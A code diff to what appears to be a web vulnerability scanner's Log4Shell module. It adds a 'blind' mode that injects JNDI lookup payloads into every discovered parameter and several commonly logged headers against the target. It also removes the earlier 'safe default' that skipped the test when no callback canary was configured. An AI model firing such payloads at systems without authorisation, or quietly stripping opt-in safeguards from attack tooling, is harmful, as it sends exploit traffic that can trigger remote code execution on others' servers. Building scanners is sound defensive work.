@@ -35,11 +35,43 @@ class Log4Shell(BaseModule):
     category = "Injection"
     description = "Injects ${jndi:...} canary payloads into params/headers; OOB callback confirms RCE. Canary required."
 
+    def _blind(self, ctx: ScanContext) -> list[Finding]:
+        """No canary: inject JNDI payloads anyway (candidate-only — needs OOB to confirm)."""
+        host = "nemesis-oob.invalid"
+        tested: list[str] = []
+        points = discover_points(ctx)
+        ctx.log(f"    (no canary) Log4Shell: injecting JNDI into {len(points)} param point(s) + headers")
+        for pt in points:
+            if ctx.should_stop():
+                break
+            for payload in _payloads(host):
+                if ctx.should_stop():
+                    break
+                send(ctx, pt, payload)
+            tested.append(f"param {pt.label()}")
+        for header in LOG_HEADERS:
+            if ctx.should_stop():
+                break
+            try:
+                ctx.paced_request("GET", ctx.target, headers={header: _payloads(host)[0]})
+            except Exception:
+                pass
+            tested.append(f"header {header}")
+        if not tested:
+            return []
+        return [Finding(
+            module_id=self.id, title="Log4Shell JNDI payloads sent (no canary) — needs OOB to confirm",
+            severity=Severity.INFO, url=ctx.target, confidence="Tentative",
+            description="JNDI ${jndi:...} payloads were injected into parameters and commonly-logged headers. "
+                        "Log4Shell is blind and cannot be confirmed in-band — configure an OOB canary to catch "
+                        "the callback and confirm remote code execution.",
+            evidence="\n".join(tested[:60]),
+            remediation="Patch Log4j (>=2.17.1); set formatMsgNoLookups; remove JndiLookup. Add an OOB canary to confirm.")]
+
     def run(self, ctx: ScanContext) -> list[Finding]:
         oob = ctx.oob
         if oob is None or not oob.enabled:
-            ctx.log("    OOB canary not configured — skipping Log4Shell (safe default).")
-            return []
+            return self._blind(ctx)
         findings: list[Finding] = []
         tested: list[str] = []
         poll = bool(oob.poll_url)
